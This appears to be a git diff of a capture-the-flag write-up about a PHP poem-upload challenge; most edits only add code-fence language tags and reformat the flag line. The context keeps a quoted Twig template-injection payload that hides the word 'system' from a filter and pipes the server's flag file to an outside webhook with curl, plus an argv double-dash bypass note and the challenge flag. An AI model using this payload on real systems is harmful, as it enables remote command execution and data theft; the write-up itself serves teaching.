@@ -565,7 +565,7 @@ Using upload peom function on `index.php`, we can't really upload the template f
 
 Going through the `DockerFile`, we seeing some weird configs for the php.
 
-```
+```bash
 RUN echo "register_argc_argv=On" > /usr/local/etc/php/conf.d/register-argc-argv.ini
 ```
 {: file="DockerFile"}
@@ -615,7 +615,7 @@ Reference: [https://hackmd.io/@vicevirus/SJx3GNKaHJg#Dear-Admin](https://hackmd.
 Their team uses `--` (double dash) since this dash aren't encoded by the function.
 
 >EDIT: The reason the double dash works here is due to the code in `config.php` when checking for the argv_argc argument. The code itself will run again `urlencode()` when it sees `$name` (no dash), `-$name` (single dash) and `--$name` (double dash)
->```
+>```php
 > function getCliOption($name) {
 >    if (!ini_get('register_argc_argv')) {
 >        return null;
@@ -661,7 +661,7 @@ Based on `admin.php`, the poem needs to have certain amout of words & lines thus
 As for their payload, here are their payload.
 
 {% raw %}
-```
+```bash
 {% set cmd = ['s','y','s','t','e','m']|join('') %}
 {{ ['cat /flag* | curl -X POST -d @- https://webhook.site/062c9157-61d7-4417-95f6-dd084c2b0c89'] | map(cmd) }}
 ```
@@ -681,11 +681,8 @@ They used `set cmd` to by pass the check of words that are disallowed in `config
 
 Other than that, they read the `flag.txt` which is at the root of the server and decided to post to their webhook. Here I realised that the code does not push the content of resulting template rendered to the user. Thus, using a webhook is a kinda a creative idea.
 
-Thus, you'll get the flag here.
-
-```
-wgmy{eae236d68a96aed8af76923357728478}
-```
+>Thus, you'll get the flag here `wgmy{eae236d68a96aed8af76923357728478}`.
+{: .prompt-tip}
 
 ## Closing
 
